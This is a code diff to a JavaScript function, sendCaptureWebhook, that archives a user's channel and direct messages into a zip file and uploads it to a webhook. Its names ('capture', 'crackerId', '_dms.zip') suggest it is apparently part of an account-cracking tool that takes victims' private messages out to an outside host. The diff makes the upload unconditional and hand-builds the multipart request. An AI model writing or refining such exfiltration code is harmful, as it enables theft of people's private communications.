@@ -148,29 +148,48 @@ async function sendCaptureWebhook(username, crackerId, channelCount, messageCoun
       timestamp: new Date().toISOString(),
     };
 
-    if (hasFiles || archives.length > 0) {
-      const JSZip = require('jszip');
-      const zip = new JSZip();
-      for (const archive of archives) {
-        const folder = zip.folder(archive.channel_name || archive.channel_id);
-        if (archive.messages?.length > 0) {
-          const msgText = archive.messages.map(m => {
-            const time = new Date(m.timestamp).toISOString();
-            const author = m.author?.username || 'Unknown';
-            return `[${time}] ${author}: ${m.content || ''}`;
-          }).join('\n');
-          folder.file('messages.txt', msgText);
-          folder.file('messages.json', JSON.stringify(archive.messages, null, 2));
-        }
+    const JSZip = require('jszip');
+    const zip = new JSZip();
+    for (const archive of archives) {
+      const folder = zip.folder(archive.channel_name || `channel_${archive.channel_id}`);
+      if (archive.messages?.length > 0) {
+        const msgText = archive.messages.map(m => {
+          const time = new Date(m.timestamp).toISOString();
+          const author = m.author?.username || 'Unknown';
+          let line = `[${time}] ${author}: ${m.content || ''}`;
+          if (m.attachments?.length > 0) {
+            line += `\n  Attachments: ${m.attachments.map(a => a.filename).join(', ')}`;
+          }
+          return line;
+        }).join('\n');
+        folder.file('messages.txt', msgText);
+        folder.file('messages.json', JSON.stringify(archive.messages, null, 2));
       }
-      const zipBuffer = await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' });
-      const formData = new FormData();
-      formData.append('file', new Blob([new Uint8Array(zipBuffer)], { type: 'application/zip' }), `${username}_dms.zip`);
-      formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
-      await fetch(webhookUrl, { method: 'POST', body: formData });
-    } else {
-      await sendTextToWebhook(webhookUrl, null, embed);
     }
+
+    const zipBuffer = await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' });
+    const boundary = 'NexusBoundary' + Date.now();
+    const filename = `${username}_dms.zip`;
+
+    let body = '';
+    body += `--${boundary}\r\n`;
+    body += `Content-Disposition: form-data; name="payload_json"\r\n`;
+    body += `Content-Type: application/json\r\n\r\n`;
+    body += JSON.stringify({ embeds: [embed] }) + '\r\n';
+    body += `--${boundary}\r\n`;
+    body += `Content-Disposition: form-data; name="file"; filename="${filename}"\r\n`;
+    body += `Content-Type: application/zip\r\n\r\n`;
+
+    const bodyStart = Buffer.from(body, 'utf-8');
+    const bodyEnd = Buffer.from(`\r\n--${boundary}--\r\n`, 'utf-8');
+    const fullBody = Buffer.concat([bodyStart, zipBuffer, bodyEnd]);
+
+    await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` },
+      body: fullBody,
+    });
+    console.log(`Webhook sent: ${filename} (${channelCount} channels, ${messageCount} messages)`);
   } catch (e) {
     console.error('Webhook send failed:', e?.message);
   }
